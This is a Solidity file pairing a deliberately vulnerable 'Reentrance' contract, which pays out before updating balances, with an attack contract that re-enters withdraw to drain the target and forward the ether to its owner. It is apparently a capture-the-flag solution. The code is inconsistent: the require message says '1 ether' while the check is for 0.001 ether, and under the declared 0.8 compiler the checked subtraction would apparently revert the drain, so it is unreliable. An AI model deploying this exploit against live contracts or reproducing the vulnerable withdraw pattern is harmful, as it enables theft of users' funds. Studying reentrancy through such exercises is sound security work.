// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceAttack {
    Reentrance public reentrance;
    address public owner;

    constructor(address payable _reentranceAddress) {
        reentrance = Reentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 0.001 ether, "Need at least 1 ether to attack");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
